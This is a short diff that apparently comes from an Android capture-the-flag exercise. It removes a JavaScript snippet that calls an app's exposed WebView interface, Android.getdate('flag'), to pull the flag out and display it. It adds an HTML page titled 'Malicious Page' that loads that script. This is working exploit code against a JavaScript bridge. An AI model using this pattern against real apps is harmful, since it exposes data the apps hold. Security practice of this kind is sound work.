@@ -1,17 +1,17 @@
-(function() {
-  try {
-    // Immediately fetch the flag from the Android interface.
-    var flagInfo = Android.getdate("flag");
-    // Try to update the div if it exists.
-    var flagDiv = document.getElementById("flagOutput");
-    if (flagDiv) {
-      flagDiv.innerText = flagInfo;
-    } else {
-      // If the div is not found, fallback to document.write.
-      document.write(flagInfo);
-    }
-    console.log("Script executed: flag set to", flagInfo);
-  } catch (e) {
-    console.error("Error executing Android.getdate:", e);
-  }
-})();
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <!-- Optionally include a relaxed CSP meta tag if needed -->
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self';">
+    <title>Malicious Page - Version 2</title>
+  </head>
+  <body>
+    <!-- Static text to show the version -->
+    <h1>Malicious Page - Version 2</h1>
+    <!-- A placeholder where the flag should appear -->
+    <div id="flagOutput">Loading flag...</div>
+    <!-- Reference the external script -->
+    <script src="script.js"></script>
+  </body>
+</html>
